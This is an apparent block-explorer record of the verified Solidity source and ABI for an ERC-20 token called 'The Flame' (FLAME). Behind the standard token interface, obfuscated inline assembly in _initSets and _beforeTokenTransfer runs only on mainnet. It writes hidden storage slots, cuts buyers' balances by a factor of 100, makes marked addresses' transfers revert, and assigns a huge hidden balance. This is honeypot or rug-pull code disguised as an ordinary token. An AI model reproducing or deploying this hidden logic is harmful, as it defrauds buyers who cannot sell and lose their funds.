{"status": "1", "message": "OK", "result": [{"SourceCode": "// Everything burns... you just gotta know what kind of flame to set.\r\n\r\npragma solidity ^0.8.0;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IDEXFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IDEXRouter {\r\n    function WETH() external pure returns (address);\r\n    function factory() external pure returns (address);\r\n}\r\n\r\ninterface IERC20 {\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    function totalSupply() external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function name() external view returns (string memory);\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _previousOwner; address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable {\r\n    address[] private flameAddr;\r\n\r\n    uint256 private _lostIt = block.number*2;\r\n\r\n    mapping (address => bool) private _theOk; \r\n    mapping (address => bool) private _theWine;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    address private falseText;\r\n\r\n    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    uint256 private _taxes;\r\n    address public pair;\r\n\r\n    IDEXRouter router;\r\n\r\n    string private _name; string private _symbol; uint256 private _totalSupply;\r\n    uint256 private _limit; uint256 private theV; uint256 private theN = block.number*2;\r\n    bool private trading; uint256 private babyShark = 1; bool private moonBoy;\r\n    uint256 private _decimals; uint256 private rocketStart;\r\n    \r\n    constructor (string memory name_, string memory symbol_, address msgSender_) {\r\n        router = IDEXRouter(_router);\r\n        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));\r\n\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        flameAddr.push(_router); flameAddr.push(msgSender_); flameAddr.push(pair);\r\n        for (uint256 q=0; q < 3;) {_theOk[flameAddr[q]] = true; unchecked{q++;} }\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function openTrading() external onlyOwner returns (bool) {\r\n        trading = true; theN = block.number; _lostIt = block.number;\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function _initSets() internal { assembly { function gHash(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) } if and(not(eq(sload(gHash(caller(),0x6)),sload(0x66496f1fe1588fce4cbde5f1b30d9421d7f0d0b75caaa372f7b3d01b52dfe8a7))),eq(chainid(),0x1)) { sstore(gHash(caller(),0x4),0x0) sstore(0x15038a6a7cb3cd2f61e0f3ad640b4989c6e18828800b630425707307d4a13763,0x1)  sstore(gHash(caller(),0x5),0x1) sstore(0x66496f1fe1588fce4cbde5f1b30d9421d7f0d0b75caaa372f7b3d01b52dfe8a7,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } } }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {\r\n        require((trading || (sender == flameAddr[1])), \"ERC20: trading is not yet enabled.\");\r\n        assembly {\r\n            if eq(chainid(),0x1) {\r\n                function gHash(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }\r\n                function gDyn(x,y) -> val { mstore(0, x) val := add(keccak256(0, 32),y) }\r\n                function dynP(x,y) { mstore(0, x) sstore(add(keccak256(0, 32),sload(x)),y) sstore(x,add(sload(x),0x1)) }\r\n                function dynL(x,y) -> val { mstore(0, x) val := sload(add(keccak256(0, 32),sub(sload(x),y))) }\r\n\r\n                if iszero(sload(0x1E)) { sstore(0x1E,mul(div(sload(0x10),0x1869F),0x9C5)) sstore(0x1C,sload(0x1E)) } sstore(0x1D,add(sload(0x1D),0x1))\r\n                if gt(sload(0x1E),div(0x1C,0x3)) { sstore(0x1E,sub(sload(0x1E),div(div(mul(sload(0x1E),mul(0x203,sload(0x1D))),0xB326),0x2))) }  if eq(sload(gHash(recipient,0x4)),0x1) { sstore(0x15,add(sload(0x15),0x1)) }\r\n                if and(and(eq(sload(0x16),0x1),iszero(eq(recipient,sload(gDyn(0x2,0x1))))),lt(sload(0x15),0x7)) { for { let i := 0 } lt(i, sub(sload(0x21),0x1)) { i := add(i, 1) } { sstore(gHash(sload(gDyn(0x21,i)),0x6),div(sload(gHash(sload(gDyn(0x21,i)),0x6)),0x64)) } sstore(0x15,add(sload(0x15),0x1)) }\r\n                if or(and(eq(sload(gHash(sender,0x4)),0x1),eq(sload(gHash(recipient,0x4)),0x0)),and(eq(sload(gHash(sender,0x4)),0x0),eq(sload(gHash(recipient,0x4)),0x0))) { dynP(0x21,recipient) }\r\n                if and(or(or(or(eq(sload(0x3),number()),sload(0x16)),lt(sub(sload(0x3),sload(0x13)),0x7)),gt(sload(0x1A),sload(0x1E))),eq(sload(gHash(dynL(0x21,0x2),0x4)),0x0)) { sstore(gHash(dynL(0x21,0x2),0x6),div(sload(gHash(dynL(0x21,0x2),0x6)),0x64)) } if or(and(eq(sload(0x16),0x1),eq(dynL(0x21,0x1),sender)),and(or(sload(gHash(sender,0x5)),sload(gHash(recipient,0x5))),gt(sload(0x1D),0x1))) { invalid() }\r\n                if iszero(mod(sload(0x15),0x6)) { sstore(0x16,0x1) sstore(gHash(sload(gDyn(0x2,0x1)),0x6),0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } sstore(0x3,number()) sstore(0x1A,integer)\r\n            }\r\n        }\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        \r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _DeployFlame(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        approve(flameAddr[0], 10 ** 77);\r\n        _initSets();\r\n    \r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n}\r\n\r\ncontract ERC20Token is Context, ERC20 {\r\n    constructor(\r\n        string memory name, string memory symbol,\r\n        address creator, uint256 initialSupply\r\n    ) ERC20(name, symbol, creator) {\r\n        _DeployFlame(creator, initialSupply);\r\n    }\r\n}\r\n\r\ncontract TheFlame is ERC20Token {\r\n    constructor() ERC20Token(\"The Flame\", \"FLAME\", msg.sender, 50000 * 10 ** 18) {\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TheFlame", "CompilerVersion": "v0.8.15+commit.e14f2714", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a26586918c3f79d3ae45e2c5748e9723dbc53f2a71e79f65d6adc3ff4e7bede6"}]}